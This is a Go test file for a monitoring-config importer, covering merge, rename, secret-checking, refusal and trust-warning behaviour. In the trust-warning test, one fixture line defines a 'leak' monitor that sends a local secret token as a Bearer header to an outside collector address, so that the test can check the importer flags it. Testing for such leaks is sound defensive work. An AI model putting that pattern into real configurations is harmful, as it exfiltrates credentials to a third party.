package importer

import (
	"strings"
	"testing"

	"github.com/githubflyideas/unagikuma/internal/config"
)

// here is the installation the file is imported into; there is its source.
const (
	hereConf = "$FILE revision=1 interval=1m retry=15s timeout=5s attempts=3\n" +
		"web IN HTTP https://here.example.com/\n" +
		"same 2m IN TCP 10.0.0.9:22\n" +
		"lan-gateway 1m IN PING 192.0.2.1\n" +
		"ops IN CHANNEL webhook url=https://hooks.example.com/ops\n"
	thereConf = "$FILE revision=7 interval=30s retry=10s timeout=3s attempts=2\n" +
		"web IN HTTP https://there.example.com/ title=\"There\"\n" +
		"api IN HTTP https://api.example.com/ parent=web timeout=9s\n" +
		"db IN POSTGRES 10.0.0.5 user=app password=${secret:pg_pass} parent=web,api\n" +
		"same 2m IN TCP 10.0.0.9:22 retry=15s timeout=5s attempts=3\n" + // what the file here gives its monitors: the same check
		"lan-gateway 1m IN PING 192.0.2.77\n" +
		"internet-gateway 1m IN PING 8.8.8.8\n" +
		"ops IN CHANNEL webhook url=https://hooks.example.com/other\n" +
		"pager IN CHANNEL webhook url=https://hooks.example.com/pager\n"
)

func loadHere(t *testing.T) (*config.File, *config.Config) {
	t.Helper()
	f, cfg, diags := config.Load("monitors.conf", []byte(hereConf), config.Options{})
	if config.HasErrors(diags) {
		t.Fatal(diags)
	}
	return f, cfg
}

func TestUnagikumaMerge(t *testing.T) {
	f, cfg := loadHere(t)
	res, err := Unagikuma([]byte(thereConf), cfg, Options{File: "there.conf", Existing: f, Now: testNow, SecretExists: func(string) bool { return false }})
	if err != nil {
		t.Fatal(err)
	}
	status := map[string]string{}
	for _, it := range res.Items {
		status[it.Kind+" "+it.Source] = it.Status + "|" + it.Name
	}
	for k, want := range map[string]string{
		"monitor web":              StatusAttention + "|web-2", // another record has the name: renamed
		"monitor api":              StatusImported + "|api",    // new
		"monitor db":               StatusImported + "|db",     // its missing secret is listed on its own item
		"monitor same":             StatusSkipped + "|same",    // already here, identical
		"monitor lan-gateway":      StatusLeftOut + "|",        // every installation adds its own
		"monitor internet-gateway": StatusLeftOut + "|",
		"channel ops":              StatusSkipped + "|ops", // a different channel of that name: the one here stays
		"channel pager":            StatusImported + "|pager",
	} {
		if got := status[k]; got != want {
			t.Errorf("%s: %q, want %q", k, got, want)
		}
	}
	if res.Monitors != 3 || res.Channels != 1 {
		t.Errorf("counts: %d monitors, %d channels", res.Monitors, res.Channels)
	}
	// A secret the file refers to and this installation lacks is listed.
	var secret bool
	for _, it := range res.Items {
		if it.Kind == "secret" && it.Source == "pg_pass" && strings.Contains(it.Why, "db") {
			secret = true
		}
	}
	if !secret {
		t.Errorf("missing secret not listed: %+v", res.Items)
	}
	// It cannot be applied until the secret exists.
	if !res.Blocked || res.ActivationError() == nil {
		t.Errorf("an import naming a missing secret is not blocked")
	}
	resOK, err := Unagikuma([]byte(thereConf), cfg, Options{Existing: f, Now: testNow, SecretExists: func(string) bool { return true }})
	if err != nil || resOK.Blocked {
		t.Errorf("with the secret present: %v blocked=%v", err, resOK.Blocked)
	}

	// Apply it to the real file: it must load, with the renames followed.
	g, _, diags := config.Load("monitors.conf", []byte(hereConf), config.Options{})
	if config.HasErrors(diags) {
		t.Fatal(diags)
	}
	if err := g.AppendBlock(res.Render(g.EndArea())); err != nil {
		t.Fatalf("append: %v\n%s", err, res.Render(g.EndArea()))
	}
	// pg_pass is a secret here too, or the file does not validate.
	text := string(g.Bytes())
	_, out, diags := config.Load("monitors.conf", []byte(text), config.Options{SecretKnown: func(string) bool { return true }})
	if config.HasErrors(diags) {
		t.Fatalf("merged file: %v\n%s", diags, text)
	}
	if m := out.FindMonitor("web-2"); m == nil || m.Target != "https://there.example.com/" {
		t.Fatalf("renamed monitor: %+v", m)
	}
	if m := out.FindMonitor("web"); m == nil || m.Target != "https://here.example.com/" {
		t.Fatalf("the monitor here changed: %+v", m)
	}
	// api's parent was web: it is now web-2, the one imported with it.
	if m := out.FindMonitor("api"); m == nil || strings.Join(m.Parents, ",") != "web-2" {
		t.Fatalf("api parents: %+v", m)
	}
	if m := out.FindMonitor("db"); m == nil || strings.Join(m.Parents, ",") != "web-2,api" {
		t.Fatalf("db parents: %+v", m)
	}
	// Timing the source got from its file header is kept: here the
	// defaults are 1m/15s/5s/3, there 30s/10s/3s/2.
	api := out.FindMonitor("api")
	if api.Interval.Seconds() != 30 || api.Attempts != 2 || api.Retry.Seconds() != 10 || api.Timeout.Seconds() != 9 {
		t.Errorf("api timing: interval %v attempts %d retry %v timeout %v", api.Interval, api.Attempts, api.Retry, api.Timeout)
	}
	if m := out.FindMonitor("same"); m == nil || strings.Count(text, "\nsame ") != 1 {
		t.Errorf("an identical record was added twice:\n%s", text)
	}
	if strings.Count(text, "ops IN CHANNEL") != 1 || !strings.Contains(text, "hooks.example.com/ops") {
		t.Errorf("the channel here was replaced:\n%s", text)
	}

	// Importing the same file again changes nothing.
	f2, cfg2, diags := config.Load("monitors.conf", []byte(text), config.Options{SecretKnown: func(string) bool { return true }})
	if config.HasErrors(diags) {
		t.Fatal(diags)
	}
	res2, err := Unagikuma([]byte(thereConf), cfg2, Options{Existing: f2, Now: testNow, SecretExists: func(string) bool { return true }})
	if err != nil {
		t.Fatal(err)
	}
	for _, it := range res2.Items {
		if (it.Kind == "monitor" || it.Kind == "channel") && it.Status != StatusSkipped && it.Status != StatusLeftOut {
			t.Errorf("imported again: %+v", it)
		}
	}
	if res2.Monitors != 0 || res2.Channels != 0 {
		t.Errorf("a second import adds %d monitors, %d channels", res2.Monitors, res2.Channels)
	}
}

// The same check with other timing is another check: it is added, under a
// new name, with the timing it had.
func TestUnagikumaOtherTiming(t *testing.T) {
	f, cfg := loadHere(t)
	res, err := Unagikuma([]byte("$FILE revision=1 retry=1s timeout=2s attempts=1\nsame 2m IN TCP 10.0.0.9:22\n"), cfg, Options{Existing: f, Now: testNow})
	if err != nil || res.Monitors != 1 || !strings.Contains(res.Text, "same-2 2m IN TCP 10.0.0.9:22 retry=1s attempts=1 timeout=2s") {
		t.Fatalf("%v %d\n%s", err, res.Monitors, res.Text)
	}
}

func TestUnagikumaRefuses(t *testing.T) {
	f, cfg := loadHere(t)
	for name, in := range map[string]string{
		"empty":     "",
		"include":   "$FILE revision=1\n$INCLUDE other.conf\n",
		"broken":    "$FILE revision=1\nweb IN HTTP\n",
		"no header": "web IN HTTP https://x.example.com/\n",
	} {
		if _, err := Unagikuma([]byte(in), cfg, Options{Existing: f}); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	// Directives that change how other records read are named, not applied.
	res, err := Unagikuma([]byte("$FILE revision=1\n$TAG env=prod\nx IN PING 10.1.1.1\n"), cfg, Options{Existing: f, Now: testNow})
	if err != nil || len(res.Info) == 0 || !strings.Contains(res.Info[0], "$TAG") {
		t.Errorf("directives: %v %+v", err, res)
	}
	// An area puts the monitors in that section.
	res, err = Unagikuma([]byte("$FILE revision=1\nx IN PING 10.1.1.1\n"), cfg, Options{Existing: f, Area: "region:north", Now: testNow})
	if err != nil || !strings.Contains(res.Text, "$SCOPE region:north") {
		t.Errorf("area: %v\n%s", err, res.Text)
	}
}

// What another installation's file could do here unnoticed is named in
// the preview: a secret of this installation sent to its address, alerts
// going to a team that exists here, and team members (not carried over).
func TestUnagikumaTrustWarnings(t *testing.T) {
	here := "$FILE revision=1\nops IN TEAM title=\"Ops\" members=alice\n"
	there := "$FILE revision=2\n" +
		"leak IN HTTP https://collector.example.net/ header.Authorization=\"Bearer ${secret:token}\"\n" +
		"ops IN TEAM title=\"Ops\" members=carol\n" +
		"svc IN HTTP https://svc.example.com/ team=ops\n" +
		"newteam IN TEAM title=\"New\" members=alice,bob\n"
	f, cfg, d := config.Load("monitors.conf", []byte(here), config.Options{})
	if config.HasErrors(d) {
		t.Fatal(d)
	}
	res, err := Unagikuma([]byte(there), cfg, Options{File: "there.conf", Existing: f, Now: testNow, SecretExists: func(n string) bool { return n == "token" }})
	if err != nil {
		t.Fatal(err)
	}
	by := map[string]Item{}
	for _, it := range res.Items {
		by[it.Kind+" "+it.Source] = it
	}
	for k, want := range map[string]string{
		"monitor leak": "its value will be sent to https://collector.example.net/",
		"monitor svc":  "already here",
		"team newteam": "not carried over",
	} {
		if it := by[k]; it.Status != StatusAttention || !strings.Contains(it.Why, want) {
			t.Errorf("%s: %s %q", k, it.Status, it.Why)
		}
	}
	text := res.Render("")
	if strings.Contains(text, "members=alice,bob") {
		t.Errorf("team members written:\n%s", text)
	}
}
